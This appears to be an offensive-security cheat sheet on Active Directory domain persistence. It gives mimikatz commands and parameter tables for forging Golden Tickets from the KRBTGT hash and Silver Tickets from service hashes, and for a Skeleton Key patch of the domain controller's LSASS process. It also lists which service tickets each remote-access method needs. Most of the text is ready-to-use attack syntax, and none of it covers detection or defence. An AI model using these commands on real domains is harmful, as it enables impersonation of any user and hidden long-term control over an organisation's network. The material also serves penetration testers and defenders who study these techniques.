# Domain Persistence

## Golden Ticket

a valid ticket forged from the Domain Controller KRBTGT hash. Allows an attacker to impersonate any user on any machine even from an host external to the domain.

```
kerberos::golden /domain:<domain> /sid:<sid> /aes256:<aes> /user:<user> /groups:<groups> /ptt
```

Create Golden Ticket as Administrator user and store it in memory

```
kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /krbtgt:<ticket> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

| Parameter                              | Description                                                                                   |
| -------------------------------------- | --------------------------------------------------------------------------------------------- |
| /user                                  | Username                                                                                      |
| /domain                                | FQDN                                                                                          |
| /sid                                   | Domain SID                                                                                    |
| /krbtgt OR /aes128 OR /aes256 OR /ntlm | key to use to generate the ticket                                                             |
| /id                                    | User ID, use 500 for Administrator                                                            |
| /groups                                |  Associated groups, accepts multiple separated by a comma. Default is 512,513,520             |
| /startoffset                           |  0 means available from now, positive numbers add a delay in minutes to the ticket activation |
| /endin                                 | Optional ticket lifetime in minutes. Default is 600 (10 hours)                                |
| /renewmax                              | Optional ticket lifetime in minutes. Default is 10080 (7 days)                                |
| /ptt OR /ticket                        | Load the ticket in memory or store it as a file for later use                                 |

## Silver Ticket

Create a valid TGT ticket from a known NTLM service hash. Allows to gain access to the service machine.

```
kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /rc4:<hash> /id:<id> /groups:<groups> /service:<srv> /target:<host>
```

| Parameter       | Description                                                                                   |
| --------------- | --------------------------------------------------------------------------------------------- |
| /user           | Username                                                                                      |
| /domain         | FQDN                                                                                          |
| /sid            | Domain SID                                                                                    |
| /rc4            | NTLM key                                                                                      |
| /id             | User ID, use 500 for Administrator                                                            |
| /groups         |  Associated groups, accepts multiple separated by a comma. Default is 512,513,520             |
| /startoffset    |  0 means available from now, positive numbers add a delay in minutes to the ticket activation |
| /endin          | Optional ticket lifetime in minutes. Default is 600 (10 hours)                                |
| /renewmax       | Optional ticket lifetime in minutes. Default is 10080 (7 days)                                |
| /service        | Type of service to attack. See table below for reference.                                     |
| /target         | The target host                                                                               |
| /ptt OR /ticket | Load the ticket in memory or store it as a file for later use                                 |

### List of tickets required by service

In case of multiple tickets, the attacker has to create a new silver ticket for the same target host for each specified service type

| Service                             | Silver Tickets service types required          |
| ----------------------------------- | ---------------------------------------------- |
| WMI                                 | HOST, RPCSS                                    |
| PowerShell Remoting                 | HOST, HTTP, WSMAN or RPCSS depending on the OS |
| WinRM                               | HOST, HTTP                                     |
| Task Scheduler                      | HOST                                           |
| LDAP                                | LDAP                                           |
| Windows File Share                  | CIFS                                           |
| Windows Remote Administration Tools | RPCSS, LDAP, CIFS                              |

## Skeleton Key

Patches the LSASS Domain Controller process to allow access for a determined user with an arbitrary password specified by the attacker. After the attack both the new password and the original one are considered valid. The default injected password is mimikatz.

```
misc::skeleton
```

###
